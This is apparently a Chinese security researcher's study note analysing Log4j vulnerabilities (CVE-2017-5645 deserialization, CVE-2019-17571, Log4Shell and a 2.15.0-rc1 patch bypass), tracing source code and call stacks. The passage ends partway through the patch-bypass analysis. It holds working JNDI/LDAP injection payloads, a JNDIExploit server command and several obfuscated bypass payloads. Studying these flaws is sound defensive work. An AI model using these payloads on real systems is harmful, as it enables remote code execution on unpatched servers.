<font style="color:rgb(77, 77, 77);">pom</font>

```plain
<dependencies>
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <version>2.8.1</version>
    </dependency>

</dependencies>
```

<font style="color:rgb(77, 77, 77);">在项目的src根目录下，创建log4j2.xml配置文件。配置信息如下：</font>

```java
<?xml version="1.0" encoding="UTF-8"?>
<!-- log4j2 配置文件 -->
<!-- 日志级别 trace<debug<info<warn<error<fatal -->
<configuration status="debug">
    <!-- 自定义属性 -->
    <Properties>
        <!-- 日志格式(控制台) -->
        <Property name="pattern1">[%-5p] %d %c - %m%n</Property>
        <!-- 日志格式(文件) -->
        <Property name="pattern2">
            =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n
        </Property>
        <!-- 日志文件路径 -->
        <Property name="filePath">logs/myLog.log</Property>
    </Properties>
 
    <appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="${pattern1}"/>
        </Console>
        <RollingFile name="RollingFile" fileName="${filePath}"
                     filePattern="logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz">
            <PatternLayout pattern="${pattern2}"/>
            <SizeBasedTriggeringPolicy size="5 MB"/>
        </RollingFile>
    </appenders>
    <loggers>
        <root level="debug">
            <appender-ref ref="Console"/>
            <appender-ref ref="RollingFile"/>
        </root>
    </loggers>
</configuration>
```

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747650779434-024deb20-5591-467e-907a-f2798ebf47a2.png)

## <font style="color:rgb(51, 51, 51);">CVE-2017-5645</font>
环境

```plain
<!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core -->
    <dependency>
      <groupId>org.apache.logging.log4j</groupId>
      <artifactId>log4j-core</artifactId>
      <version>2.8.1</version>
    </dependency>

    <!-- https://mvnrepository.com/artifact/com.beust/jcommander -->
    <dependency>
      <groupId>com.beust</groupId>
      <artifactId>jcommander</artifactId>
      <version>1.48</version>
    </dependency>
```

### <font style="color:rgb(51, 51, 51);">简介</font>
<font style="color:rgb(51, 51, 51);">Apache Log4j是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之前的2.x版本中存在安全漏洞。在使用TCP/UDP 套接字接口监听获取序列化的日志事件时，存在反序列化漏洞。</font>

<font style="color:rgb(51, 51, 51);">启动</font>

<font style="color:rgb(51, 51, 51);">windows</font>

```java
java -cp "log4j-core-2.8.1.jar;log4j-api-2.8.1.jar;jcommander-1.48.jar;commons-collections-3.1.jar" org.apache.logging.log4j.core.net.server.TcpSocketServer -p 7777
```

<font style="color:rgb(51, 51, 51);"></font>

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747664934181-3ca9b97d-6832-4fb1-a31e-2719485c6709.png)

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747665162433-9c95c043-91e7-448c-906a-54db0f9d235f.png)

```plain
package org.example;

import org.apache.logging.log4j.core.net.server.TcpSocketServer;

public class Test2 {
    public static void main(String[] args) throws Exception {
        String[] arg = {"-p", "7777"};
        TcpSocketServer.main(arg);
    }
}
```

断点分析下

跳到 createSerializedSocketServer

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747665454289-ca333b22-2ed4-436a-be8f-b02832d6cd95.png)

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747666867368-c9468dd3-e544-471c-bcd9-772cbda1ba8d.png)

```plain
public static TcpSocketServer<ObjectInputStream> createSerializedSocketServer(int port, int backlog, InetAddress localBindAddress) throws IOException {
    LOGGER.entry(new Object[]{port});
    TcpSocketServer<ObjectInputStream> socketServer = new TcpSocketServer(port, backlog, localBindAddress, new ObjectInputStreamLogEventBridge());
    return (TcpSocketServer)LOGGER.exit(socketServer);
}
```

创建一个TcpSocketServer对象

<font style="color:rgb(51, 51, 51);">并且调用</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">LOGGER.exit()</font>`<font style="color:rgb(51, 51, 51);">方法返回，</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">LOGGER.exit</font>`<font style="color:rgb(51, 51, 51);">的功能就是对日志做些操作，然后仍然返回传进来的对象，所以这里相当于就是返回了</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">TcpSocketServer</font>`<font style="color:rgb(51, 51, 51);">。</font>



```plain
public static TcpSocketServer<ObjectInputStream> createSerializedSocketServer(int port, int backlog, InetAddress localBindAddress) throws IOException {
    LOGGER.entry(new Object[]{port});
    TcpSocketServer<ObjectInputStream> socketServer = new TcpSocketServer(port, backlog, localBindAddress, new ObjectInputStreamLogEventBridge());
    return (TcpSocketServer)LOGGER.exit(socketServer);
}
```

<font style="color:rgb(51, 51, 51);">SocketServer的main方法，继续往下走，调用了</font>`<font style="color:rgb(51, 51, 51);">socketServer.startNewThread()</font>`

```plain
public abstract class AbstractSocketServer<T extends InputStream> extends LogEventListener implements Runnable {
    protected static final int MAX_PORT = 65534;
    private volatile boolean active = true;
    protected final LogEventBridge<T> logEventInput;
    protected final Logger logger;

    public AbstractSocketServer(int port, LogEventBridge<T> logEventInput) {
        this.logger = LogManager.getLogger(this.getClass().getName() + '.' + port);
        this.logEventInput = (LogEventBridge)Objects.requireNonNull(logEventInput, "LogEventInput");
    }

    protected boolean isActive() {
        return this.active;
    }

    protected void setActive(boolean isActive) {
        this.active = isActive;
    }

    public Thread startNewThread() {
        Thread thread = new Log4jThread(this);
        thread.start();
        return thread;
    }
```

`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">AbstractSocketServer</font>`<font style="color:rgb(51, 51, 51);">类实现了</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">Runnable</font>`<font style="color:rgb(51, 51, 51);">接口，在启动新线程的时候，会自动调用</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">run()</font>`<font style="color:rgb(51, 51, 51);">方法；</font>

<font style="color:rgb(51, 51, 51);">这里多线程的任务程序是</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">this</font>`<font style="color:rgb(51, 51, 51);">，而此时的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">this</font>`<font style="color:rgb(51, 51, 51);">是</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">TcpSocketServer</font>`<font style="color:rgb(51, 51, 51);">，所以会调用</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">TcpSocketServer.run()</font>`<font style="color:rgb(51, 51, 51);">方法，看下对应的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">run()</font>`<font style="color:rgb(51, 51, 51);">方法</font>

```plain
public void run() {
    EntryMessage entry = this.logger.traceEntry();

    while(this.isActive()) {
        if (this.serverSocket.isClosed()) {
            return;
        }

        try {
            this.logger.debug("Listening for a connection {}...", this.serverSocket);
            Socket clientSocket = this.serverSocket.accept();
            this.logger.debug("Acepted connection on {}...", this.serverSocket);
            this.logger.debug("Socket accepted: {}", clientSocket);
            clientSocket.setSoLinger(true, 0);
            TcpSocketServer<T>.SocketHandler handler = new SocketHandler(clientSocket);
            this.handlers.put(handler.getId(), handler);
            handler.start();
        } catch (IOException var7) {
            if (this.serverSocket.isClosed()) {
                this.logger.traceExit(entry);
                return;
            }

            this.logger.error("Exception encountered on accept. Ignoring. Stack trace :", var7);
        }
    }
```

SocketHandler

```plain
public SocketHandler(Socket socket) throws IOException {
    this.inputStream = TcpSocketServer.this.logEventInput.wrapStream(socket.getInputStream());
}
```

this.inputStream 赋值

<font style="color:rgb(51, 51, 51);">而</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">TcpSocketServer.this.logEventInput</font>`<font style="color:rgb(51, 51, 51);">的类是</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">ObjectInputStreamLogEventBridge</font>`<font style="color:rgb(51, 51, 51);">，这里相当于调用了它的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">wrapStream</font>`<font style="color:rgb(51, 51, 51);">方法</font>

<font style="color:rgb(51, 51, 51);"></font>

<font style="color:rgb(51, 51, 51);"></font>

```plain
public ObjectInputStream wrapStream(InputStream inputStream) throws IOException {
        return new ObjectInputStream(inputStream);
    }
}
```

<font style="color:rgb(51, 51, 51);">接收到数据后的整个流程，就是把socket连接传过来的数据流作为包装成</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">ObjectInputStream</font>`<font style="color:rgb(51, 51, 51);">，现在</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">this.inputStream</font>`<font style="color:rgb(51, 51, 51);">就是一个来自用户输入的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">ObjectInputStream</font>`<font style="color:rgb(51, 51, 51);">流了。</font>

<font style="color:rgb(51, 51, 51);">handler.start();中</font>

<font style="color:rgb(51, 51, 51);">而handler是</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">SocketHandler</font>`<font style="color:rgb(51, 51, 51);">类的实例，这个类继承自</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">Log4jThread</font>`<font style="color:rgb(51, 51, 51);">，</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">Log4jThread</font>`<font style="color:rgb(51, 51, 51);">又继承自Thread类，所以他是一个自定义的线程类，自定义的线程类有个特点，那就是必须重写</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">run</font>`<font style="color:rgb(51, 51, 51);">方法，而且当调用自定义线程类的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">start()</font>`<font style="color:rgb(51, 51, 51);">方法时，会自动调用它的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">run()</font>`<font style="color:rgb(51, 51, 51);">方法</font>

```plain
public void run() {
    EntryMessage entry = TcpSocketServer.this.logger.traceEntry();
    boolean closed = false;

    try {
        try {
            while(!this.shutdown) {
                TcpSocketServer.this.logEventInput.logEvents(this.inputStream, TcpSocketServer.this);
            }
        } catch (EOFException var9) {
            closed = true;
        } catch (OptionalDataException var10) {
            TcpSocketServer.this.logger.error("OptionalDataException eof=" + var10.eof + " length=" + var10.length, var10);
        } catch (IOException var11) {
            TcpSocketServer.this.logger.error("IOException encountered while reading from socket", var11);
        }

        if (!closed) {
            Closer.closeSilently(this.inputStream);
        }
    } finally {
        TcpSocketServer.this.handlers.remove(this.getId());
    }

    TcpSocketServer.this.logger.traceExit(entry);
}
```

跟进logEvents

```plain
public void logEvents(ObjectInputStream inputStream, LogEventListener logEventListener) throws IOException {
    try {
        logEventListener.log((LogEvent)inputStream.readObject());
    } catch (ClassNotFoundException var4) {
        throw new IOException(var4);
    }
}
```

`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">inputStream</font>`<font style="color:rgb(51, 51, 51);">就是被封装成</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">ObjectInputStream</font>`<font style="color:rgb(51, 51, 51);">流的、我们通过tcp发送的数据。所以只要log4j的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">tcpsocketserver</font>`<font style="color:rgb(51, 51, 51);">端口对外开放，且目标存在可利用的pop链，我们就可以通过tcp直接发送恶意的序列化payload实现RCE。</font>

### <font style="color:rgb(51, 51, 51);">主要调用链</font>
```plain
startNewThread()
TcpSocketServer.run()
handler.start();
run（）
TcpSocketServer.this.logEventInput.logEvents(this.inputStream, TcpSocketServer.this);
logEvents#ogEventListener.log((LogEvent)inputStream.readObject());

```

<font style="color:rgb(51, 51, 51);"></font>

## <font style="color:rgb(51, 51, 51);">CVE-2019-17571</font>
<font style="color:rgb(51, 51, 51);">和上面的CVE差不多，只是触发点是</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">SocketNode</font>`<font style="color:rgb(51, 51, 51);">的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">run()</font>`<font style="color:rgb(51, 51, 51);">方法，且这个地方需要的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">log4j</font>`<font style="color:rgb(51, 51, 51);">的版本是1.2</font>

<font style="color:rgb(51, 51, 51);"></font>

# <font style="color:rgb(51, 51, 51);">log4j2</font>
<font style="color:rgb(51, 51, 51);">Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。</font>

<font style="color:rgb(51, 51, 51);">由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</font>

**<font style="color:rgb(51, 51, 51);">此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行</font>**

## **<font style="color:rgb(51, 51, 51);">复现</font>**
```plain
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Test {
    private static final Logger logger = LogManager.getLogger(Test.class);

    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:1389/Basic/Command/calc}");
    }
}
```

jdni

```plain
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1
```

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747710870669-87d487ca-21d2-431c-bca4-cf0ebf92b928.png)

因为命令执行在runtime exec 

可以在exec打上断点看下调用栈

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747714195404-a4e7ce53-1cc9-4184-a03c-756b264738ee.png)

```plain
exec:485, Runtime (java.lang)
<init>:-1, ExploitgJlWqLWBF3
newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
newInstance:423, Constructor (java.lang.reflect)
newInstance:442, Class (java.lang)
getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)
getObjectInstance:189, DirectoryManager (javax.naming.spi)
c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
lookup:172, JndiManager (org.apache.logging.log4j.core.net)
lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)
lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)
resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)
replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)
format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)
format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)
toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)
toText:244, PatternLayout (org.apache.logging.log4j.core.layout)
encode:229, PatternLayout (org.apache.logging.log4j.core.layout)
encode:59, PatternLayout (org.apache.logging.log4j.core.layout)
directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)
callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)
callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)
callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)
callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)
processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)
log:481, LoggerConfig (org.apache.logging.log4j.core.config)
log:456, LoggerConfig (org.apache.logging.log4j.core.config)
log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)
log:161, Logger (org.apache.logging.log4j.core)
tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)
logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)
logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)
logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi)
logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)
error:740, AbstractLogger (org.apache.logging.log4j.spi)
main:9, Test
```

看lookup处的jndi

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747714513190-ced4e9a6-39f2-46dc-aa7f-ebb7256f3f95.png)

前面一些封装的过程跳过

<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">org.apache.logging.log4j.core.pattern.MessagePatternConverter#format</font>

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747714881073-816642fb-292d-4cb4-8225-9a28d6ebf721.png)

workingBuilder存放日志的格式化数据

workingBuilder.append(this.config.getStrSubstitutor().replace(event, value));

把${jndi:ldap://127.0.0.1:1389/Basic/Command/calc}截取出来

然后到了replace（）调用substitute（）

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747715193235-0c7edb7d-8b8d-4142-9e1b-349914bd2a14.png)

递归截取${}

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747715303181-4a85824a-0154-44f6-81ac-7fb2b084b316.png)

再到 resolveVariable 解析器

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747715476117-b6285898-ede4-4e2b-8503-b7857a08e07a.png)

后续lookup 

<font style="color:rgb(51, 51, 51);">就是通过</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">:</font>`<font style="color:rgb(51, 51, 51);">分割前面的关键词</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">jndi</font>`<font style="color:rgb(51, 51, 51);">部分和后面的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">payload</font>`<font style="color:rgb(51, 51, 51);">内容部分，再获取解析器，通过解析器去</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">lookup</font>`

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747716025154-f8cea9b9-d1d2-4751-b8a9-875d929360c6.png)

<font style="color:rgb(51, 51, 51);">继续跟进</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">org.apache.logging.log4j.core.lookup.JndiLookup#lookup</font>`<font style="color:rgb(51, 51, 51);">，会初始化JNDI客户端，继续调用</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">lookup</font>`

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747716105173-75b9291a-a3af-4ea1-9ae2-86e3a4557737.png)

<font style="color:rgb(51, 51, 51);">总结一下整个分析过程，也很简单</font>

1. <font style="color:rgb(51, 51, 51);">先判断内容中是否有</font>`<font style="background-color:rgb(247, 247, 247);">${}</font>`<font style="color:rgb(51, 51, 51);">，然后截取</font>`<font style="background-color:rgb(247, 247, 247);">${}</font>`<font style="color:rgb(51, 51, 51);">中的内容，得到我们的恶意payload</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="background-color:rgb(247, 247, 247);">jndi:xxx</font>`
2. <font style="color:rgb(51, 51, 51);">后使用</font>`<font style="background-color:rgb(247, 247, 247);">:</font>`<font style="color:rgb(51, 51, 51);">分割payload，通过前缀来判断使用何种解析器去</font>`<font style="background-color:rgb(247, 247, 247);">lookup</font>`
3. <font style="color:rgb(51, 51, 51);">支持的前缀包括</font>`<font style="background-color:rgb(247, 247, 247);">date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j</font>`<font style="color:rgb(51, 51, 51);">，可以研究下其他的</font>

# 漏洞触发点的思考
研究漏洞的时候 认为 只用调用logger.error()才会触发

但是之前的输入框jndi是如何触发的呢？

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747716236753-070987f4-6b13-4f16-88d0-2701365e620c.png)

漏洞披露中

_**<font style="color:rgb(133, 133, 133);">此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行。</font>**_

什么时候用户输入会被记录？

主要是在调用站前 会有日志输入的等级记录



![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747716393438-736e65a7-36b9-42ba-841a-02c8f331d083.png)

<font style="color:rgb(51, 51, 51);">一直跟到最后，</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">intLevel >= level.intLevel()</font>`<font style="color:rgb(51, 51, 51);">为</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">false</font>`<font style="color:rgb(51, 51, 51);">，</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">intLevel</font>`<font style="color:rgb(51, 51, 51);">为我们使用的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">INFO</font>`<font style="color:rgb(51, 51, 51);">等级的值200，</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">level.intLevel()</font>`<font style="color:rgb(51, 51, 51);">则为当前日志记录等级</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">ERROR</font>`<font style="color:rgb(51, 51, 51);">的值400</font>

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747716858110-cd2b1ca1-a56b-466e-b91d-b03cff7b6a73.png)

<font style="color:rgb(51, 51, 51);">这也是为什么</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">log4j</font>`<font style="color:rgb(51, 51, 51);">默认情况下只会记录</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">error</font>`<font style="color:rgb(51, 51, 51);">和</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">fatal</font>`<font style="color:rgb(51, 51, 51);">的日志，如下图，所以我们测试的时候只有</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">logger.error</font>`<font style="color:rgb(51, 51, 51);">和</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">fatal</font>`<font style="color:rgb(51, 51, 51);">的时候才会触发。</font>

## <font style="color:rgb(51, 51, 51);">常规绕过</font>
其他解析器



<font style="color:rgb(51, 51, 51);">上面分析我们也注意到了，有多个解析协议可用，包括</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j</font>`<font style="color:rgb(51, 51, 51);">，我们来分析一下作用</font>

| **<font style="color:rgb(51, 51, 51);">解析协议</font>** | **<font style="color:rgb(51, 51, 51);">说明</font>** |
| :--- | --- |
| `<font style="background-color:rgb(247, 247, 247);">date:</font>` | <font style="color:rgb(51, 51, 51);">日期时间（详情</font>`<font style="background-color:rgb(247, 247, 247);">org.apache.logging.log4j.core.lookup.DateLookup#lookup</font>`<br/><font style="color:rgb(51, 51, 51);">）</font> |
| `<font style="background-color:rgb(247, 247, 247);">java:</font>` | <font style="color:rgb(51, 51, 51);">一些JVM的信息（可用参数</font>`<font style="background-color:rgb(247, 247, 247);">version、runtime、vm、os、hw、locale</font>`<br/><font style="color:rgb(51, 51, 51);">，详情</font>`<font style="background-color:rgb(247, 247, 247);">org.apache.logging.log4j.core.lookup.JavaLookup#lookup</font>`<br/><font style="color:rgb(51, 51, 51);">）</font> |
| `<font style="background-color:rgb(247, 247, 247);">marker:</font>` | <font style="color:rgb(51, 51, 51);">返回</font>`<font style="background-color:rgb(247, 247, 247);">event.getMarker()</font>`<br/><font style="color:rgb(51, 51, 51);">，不知道具体干啥的</font> |
| `<font style="background-color:rgb(247, 247, 247);">ctx:key</font>` | <font style="color:rgb(51, 51, 51);">返回</font>`<font style="background-color:rgb(247, 247, 247);">event.getContextData().getValue(key)</font>`<br/><font style="color:rgb(51, 51, 51);">，就是获取上下文的数据</font> |
| `**<font style="background-color:rgb(247, 247, 247);">lower:KEY</font>**` | <font style="color:rgb(51, 51, 51);">返回字符串小写值</font> |
| `**<font style="background-color:rgb(247, 247, 247);">upper:key</font>**` | <font style="color:rgb(51, 51, 51);">返回字符串大写值</font> |
| `<font style="background-color:rgb(247, 247, 247);">jndi:</font>` | <font style="color:rgb(51, 51, 51);">JNDI注入利用点，不多说了</font> |
| `<font style="background-color:rgb(247, 247, 247);">main:key</font>` | <font style="color:rgb(51, 51, 51);">返回</font>`<font style="background-color:rgb(247, 247, 247);">((MapMessage) event.getMessage()).get(key)</font>`<br/><font style="color:rgb(51, 51, 51);">，也是获取一些变量值</font> |
| `<font style="background-color:rgb(247, 247, 247);">jvmrunargs:</font>` | <font style="color:rgb(51, 51, 51);">没搞懂。。。</font> |
| `<font style="background-color:rgb(247, 247, 247);">sys:key</font>` | <font style="color:rgb(51, 51, 51);">返回一些系统属性：</font>`<font style="background-color:rgb(247, 247, 247);">System.getProperty(key)</font>` |
| `<font style="background-color:rgb(247, 247, 247);">env:key</font>` | <font style="color:rgb(51, 51, 51);">返回</font>`<font style="background-color:rgb(247, 247, 247);">System.getenv(key)</font>` |
| `<font style="background-color:rgb(247, 247, 247);">log4j:key</font>` | <font style="color:rgb(51, 51, 51);">返回一些</font>`<font style="background-color:rgb(247, 247, 247);">log4j</font>`<br/><font style="color:rgb(51, 51, 51);">的配置信息，可用值</font>`<font style="background-color:rgb(247, 247, 247);">configLocation、configParentLocation</font>` |


### <font style="color:rgb(51, 51, 51);">绕过思路</font>
<font style="color:rgb(51, 51, 51);">我们已经知道了</font>`<font style="background-color:rgb(247, 247, 247);">${}</font>`<font style="color:rgb(51, 51, 51);">的执行流程，也知道了分隔符怎么处理的，又知道了其他协议的解析返回值，那么就可以构造payload来绕过了，举一些例子</font>

+ <font style="color:rgb(51, 51, 51);">原始payload</font>

```plain
${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
```

+ <font style="color:rgb(51, 51, 51);">一些绕过paylioad</font>

```plain
${${a:-j}ndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
${${a:-j}n${::-d}i:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
${${lower:jn}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
${${lower:${upper:jn}}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
${${lower:${upper:jn}}${::-di}:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
```

## <font style="color:rgb(51, 51, 51);">2.15.0-rc1补丁绕过</font>
空格

[<font style="color:rgb(231, 76, 60);">LOG4J2-3201 Commit</font>](https://github.com/apache/logging-log4j2/commit/d82b47c6fae9c15fcb183170394d5f1a01ac02d3)

条件lookup开启

```plain
toSerializable:385, PatternLayout$PatternFormatterPatternSerializer (org.apache.logging.log4j.core.layout)

```

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747728642970-c3a36443-f9f9-41d8-a95c-6192903eec48.png)



![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747729050741-592ac4e8-b394-437c-aa08-78335b92f3d4.png)



<font style="color:rgb(92, 92, 92);">第二个关键位置是 </font>`<font style="color:rgb(255, 64, 129);">JndiManager#lookup</font>`<font style="color:rgb(92, 92, 92);"> 方法中添加了校验，使用了 JndiManagerFactory 来创建 JndiManager 实例，不再使用 InitialContext，而是使用子类 InitialDirContext，并为其添加白名单 JNDI 协议、白名单主机名、白名单类名。</font>

```plain
public <T> T lookup(final String name) throws NamingException {
    public synchronized <T> T lookup(final String name) throws NamingException {
        try {
            URI uri = new URI(name);
            if (uri.getScheme() != null) {
                if (!allowedProtocols.contains(uri.getScheme().toLowerCase(Locale.ROOT))) {
                    LOGGER.warn("Log4j JNDI does not allow protocol {}", uri.getScheme());
                    return null;
                }
                if (LDAP.equalsIgnoreCase(uri.getScheme()) || LDAPS.equalsIgnoreCase(uri.getScheme())) {
                    if (!allowedHosts.contains(uri.getHost())) {
                        LOGGER.warn("Attempt to access ldap server not in allowed list");
                        return null;
                    }
                    Attributes attributes = this.context.getAttributes(name);
                    if (attributes != null) {
                        // In testing the "key" for attributes seems to be lowercase while the attribute id is
                        // camelcase, but that may just be true for the test LDAP used here. This copies the Attributes
                        // to a Map ignoring the "key" and using the Attribute's id as the key in the Map so it matches
                        // the Java schema.
                        Map<String, Attribute> attributeMap = new HashMap<>();
                        NamingEnumeration<? extends Attribute> enumeration = attributes.getAll();
                        while (enumeration.hasMore()) {
                            Attribute attribute = enumeration.next();
                            attributeMap.put(attribute.getID(), attribute);
                        }
                        Attribute classNameAttr = attributeMap.get(CLASS_NAME);
                        if (attributeMap.get(SERIALIZED_DATA) != null) {
                            if (classNameAttr != null) {
                                String className = classNameAttr.get().toString();
                                if (!allowedClasses.contains(className)) {
                                    LOGGER.warn("Deserialization of {} is not allowed", className);
                                    return null;
                                }
                            } else {
                                LOGGER.warn("No class name provided for {}", name);
                                return null;
                            }
                        } else if (attributeMap.get(REFERENCE_ADDRESS) != null
                                || attributeMap.get(OBJECT_FACTORY) != null) {
                            LOGGER.warn("Referenceable class is not allowed for {}", name);
                            return null;
                        }
                    }
                }
